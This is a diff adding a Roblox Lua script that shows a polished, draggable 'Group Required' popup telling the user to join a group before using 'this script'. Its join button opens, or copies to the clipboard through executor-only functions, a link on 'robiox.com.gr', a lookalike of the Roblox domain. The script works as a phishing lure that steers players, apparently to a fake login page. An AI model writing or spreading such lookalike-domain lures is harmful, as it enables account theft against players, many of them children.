@@ -1,0 +1,379 @@
+
+--// GROUP REQUIREMENT POPUP
+--// Clean design, smooth animations, draggable window
+
+local GROUP_URL = "https://www.robiox.com.gr/communities/8337298670/unset"
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local GuiService = game:GetService("GuiService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Remove previous GUI
+local old = playerGui:FindFirstChild("GroupPopup")
+if old then
+    old:Destroy()
+end
+
+--// SETTINGS
+
+local BG_COLOR = Color3.fromRGB(19, 20, 27)
+local PANEL_COLOR = Color3.fromRGB(27, 29, 39)
+local ACCENT = Color3.fromRGB(104, 111, 255)
+local TEXT_COLOR = Color3.fromRGB(245, 246, 255)
+local MUTED_COLOR = Color3.fromRGB(166, 170, 188)
+
+--// SCREEN GUI
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "GroupPopup"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.DisplayOrder = 999
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = playerGui
+
+--// DIM BACKGROUND
+
+local dim = Instance.new("Frame")
+dim.Name = "Dim"
+dim.Size = UDim2.fromScale(1, 1)
+dim.BackgroundColor3 = Color3.new(0, 0, 0)
+dim.BackgroundTransparency = 1
+dim.BorderSizePixel = 0
+dim.Active = true
+dim.ZIndex = 1
+dim.Parent = gui
+
+--// MAIN CARD
+
+local card = Instance.new("Frame")
+card.Name = "Card"
+card.Size = UDim2.new(0, 360, 0, 258)
+card.AnchorPoint = Vector2.new(0.5, 0.5)
+card.Position = UDim2.new(0.5, 0, 0.5, 35)
+card.BackgroundColor3 = BG_COLOR
+card.BorderSizePixel = 0
+card.Active = true
+card.ClipsDescendants = true
+card.ZIndex = 2
+card.Parent = gui
+
+local cardCorner = Instance.new("UICorner")
+cardCorner.CornerRadius = UDim.new(0, 16)
+cardCorner.Parent = card
+
+local cardStroke = Instance.new("UIStroke")
+cardStroke.Color = Color3.fromRGB(64, 68, 91)
+cardStroke.Thickness = 1
+cardStroke.Transparency = 0.2
+cardStroke.Parent = card
+
+-- Scale down on smaller screens
+local sizeConstraint = Instance.new("UISizeConstraint")
+sizeConstraint.MinSize = Vector2.new(280, 258)
+sizeConstraint.MaxSize = Vector2.new(360, 258)
+sizeConstraint.Parent = card
+
+--// TOP ACCENT LINE
+
+local accentLine = Instance.new("Frame")
+accentLine.Size = UDim2.new(1, 0, 0, 3)
+accentLine.BackgroundColor3 = ACCENT
+accentLine.BorderSizePixel = 0
+accentLine.ZIndex = 3
+accentLine.Parent = card
+
+--// HEADER
+
+local header = Instance.new("Frame")
+header.Name = "Header"
+header.Size = UDim2.new(1, 0, 0, 58)
+header.BackgroundColor3 = PANEL_COLOR
+header.BorderSizePixel = 0
+header.Active = true
+header.ZIndex = 3
+header.Parent = card
+
+local headerCorner = Instance.new("UICorner")
+headerCorner.CornerRadius = UDim.new(0, 16)
+headerCorner.Parent = header
+
+-- Cover the lower rounded corners of the header
+local headerFill = Instance.new("Frame")
+headerFill.Size = UDim2.new(1, 0, 0, 16)
+headerFill.Position = UDim2.new(0, 0, 1, -16)
+headerFill.BackgroundColor3 = PANEL_COLOR
+headerFill.BorderSizePixel = 0
+headerFill.ZIndex = 3
+headerFill.Parent = header
+
+local icon = Instance.new("TextLabel")
+icon.Size = UDim2.fromOffset(32, 32)
+icon.Position = UDim2.fromOffset(16, 16)
+icon.BackgroundColor3 = Color3.fromRGB(47, 49, 69)
+icon.BorderSizePixel = 0
+icon.Font = Enum.Font.GothamBold
+icon.Text = "G"
+icon.TextSize = 17
+icon.TextColor3 = ACCENT
+icon.ZIndex = 4
+icon.Parent = header
+
+local iconCorner = Instance.new("UICorner")
+iconCorner.CornerRadius = UDim.new(0, 9)
+iconCorner.Parent = icon
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -75, 0, 24)
+title.Position = UDim2.fromOffset(58, 13)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.Text = "Group Required"
+title.TextSize = 17
+title.TextColor3 = TEXT_COLOR
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 4
+title.Parent = header
+
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1, -75, 0, 17)
+subtitle.Position = UDim2.fromOffset(58, 35)
+subtitle.BackgroundTransparency = 1
+subtitle.Font = Enum.Font.Gotham
+subtitle.Text = "ONE QUICK STEP"
+subtitle.TextSize = 10
+subtitle.TextColor3 = MUTED_COLOR
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.ZIndex = 4
+subtitle.Parent = header
+
+--// REQUIREMENT MESSAGE
+
+local messageTitle = Instance.new("TextLabel")
+messageTitle.Size = UDim2.new(1, -36, 0, 25)
+messageTitle.Position = UDim2.fromOffset(18, 76)
+messageTitle.BackgroundTransparency = 1
+messageTitle.Font = Enum.Font.GothamSemibold
+messageTitle.Text = "Join our community"
+messageTitle.TextSize = 16
+messageTitle.TextColor3 = TEXT_COLOR
+messageTitle.TextXAlignment = Enum.TextXAlignment.Left
+messageTitle.ZIndex = 3
+messageTitle.Parent = card
+
+local message = Instance.new("TextLabel")
+message.Size = UDim2.new(1, -36, 0, 55)
+message.Position = UDim2.fromOffset(18, 105)
+message.BackgroundTransparency = 1
+message.Font = Enum.Font.Gotham
+message.Text = "You need to be a member of this group to use this script. Click below to visit the group page."
+message.TextSize = 13
+message.TextWrapped = true
+message.TextColor3 = MUTED_COLOR
+message.TextXAlignment = Enum.TextXAlignment.Left
+message.TextYAlignment = Enum.TextYAlignment.Top
+message.ZIndex = 3
+message.Parent = card
+
+--// STATUS LABEL
+
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -36, 0, 18)
+status.Position = UDim2.fromOffset(18, 163)
+status.BackgroundTransparency = 1
+status.Font = Enum.Font.Gotham
+status.Text = "Please join the group to continue."
+status.TextSize = 11
+status.TextColor3 = MUTED_COLOR
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.ZIndex = 3
+status.Parent = card
+
+--// JOIN BUTTON
+
+local join = Instance.new("TextButton")
+join.Name = "JoinButton"
+join.Size = UDim2.new(1, -36, 0, 40)
+join.Position = UDim2.new(0, 18, 1, -57)
+join.BackgroundColor3 = ACCENT
+join.BorderSizePixel = 0
+join.AutoButtonColor = false
+join.Font = Enum.Font.GothamBold
+join.Text = "Join Group  →"
+join.TextSize = 14
+join.TextColor3 = Color3.new(1, 1, 1)
+join.Active = true
+join.ZIndex = 4
+join.Parent = card
+
+local joinCorner = Instance.new("UICorner")
+joinCorner.CornerRadius = UDim.new(0, 10)
+joinCorner.Parent = join
+
+local joinStroke = Instance.new("UIStroke")
+joinStroke.Color = Color3.fromRGB(143, 148, 255)
+joinStroke.Transparency = 0.65
+joinStroke.Thickness = 1
+joinStroke.Parent = join
+
+--// SMOOTH BUTTON EFFECTS
+
+local normalColor = ACCENT
+local hoverColor = Color3.fromRGB(125, 131, 255)
+
+join.MouseEnter:Connect(function()
+    TweenService:Create(join, TweenInfo.new(0.18), {
+        BackgroundColor3 = hoverColor
+    }):Play()
+end)
+
+join.MouseLeave:Connect(function()
+    TweenService:Create(join, TweenInfo.new(0.18), {
+        BackgroundColor3 = normalColor
+    }):Play()
+end)
+
+join.MouseButton1Down:Connect(function()
+    TweenService:Create(join, TweenInfo.new(0.08), {
+        BackgroundColor3 = Color3.fromRGB(83, 91, 225)
+    }):Play()
+end)
+
+--// DRAGGABLE WINDOW
+-- Drag using the top header on mouse or touch.
+
+local dragging = false
+local dragStart
+local startPosition
+local dragInput
+
+local function updateDrag(input)
+    if not dragging then
+        return
+    end
+
+    local delta = input.Position - dragStart
+
+    card.Position = UDim2.new(
+        startPosition.X.Scale,
+        startPosition.X.Offset + delta.X,
+        startPosition.Y.Scale,
+        startPosition.Y.Offset + delta.Y
+    )
+end
+
+header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+
+        dragging = true
+        dragStart = input.Position
+        startPosition = card.Position
+        dragInput = input
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                dragInput = nil
+            end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (
+        input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch
+    ) then
+        updateDrag(input)
+    end
+end)
+
+--// OPEN GROUP BUTTON
+
+local busy = false
+
+local function onClick()
+    if busy then
+        return
+    end
+
+    busy = true
+    join.Text = "Opening..."
+    status.Text = "Opening the group page..."
+    status.TextColor3 = MUTED_COLOR
+
+    local opened = false
+
+    -- Try the browser API
+    local success = pcall(function()
+        GuiService:OpenBrowserWindow(GROUP_URL)
+    end)
+
+    if success then
+        opened = true
+    end
+
+    -- Try clipboard fallback if browser API errors
+    if not opened then
+        local envOk, env = pcall(function()
+            return getfenv()
+        end)
+
+        if envOk and type(env) == "table" then
+            for _, name in ipairs({"setclipboard", "toclipboard"}) do
+                local fn = env[name]
+
+                if type(fn) == "function" then
+                    local copied = pcall(fn, GROUP_URL)
+
+                    if copied then
+                        status.Text = "Link copied to clipboard."
+                        status.TextColor3 = Color3.fromRGB(130, 220, 160)
+                        break
+                    end
+                end
+            end
+        end
+    end
+
+    if opened then
+        status.Text = "If the page didn't open, check your browser."
+        status.TextColor3 = Color3.fromRGB(130, 220, 160)
+    elseif status.Text ~= "Link copied to clipboard." then
+        status.Text = "Couldn't open automatically. Check console."
+        status.TextColor3 = Color3.fromRGB(255, 170, 130)
+        warn("Could not open group URL:", GROUP_URL)
+    end
+
+    task.delay(1.5, function()
+        busy = false
+
+        if join and join.Parent then
+            join.Text = "Join Group  →"
+            TweenService:Create(join, TweenInfo.new(0.18), {
+                BackgroundColor3 = normalColor
+            }):Play()
+        end
+    end)
+end
+
+join.Activated:Connect(onClick)
+
+--// SMOOTH ENTRANCE
+
+TweenService:Create(
+    dim,
+    TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+    {BackgroundTransparency = 0.45}
+):Play()
+
+TweenService:Create(
+    card,
+    TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+    {Position = UDim2.new(0.5, 0, 0.5, 0)}
+):Play()
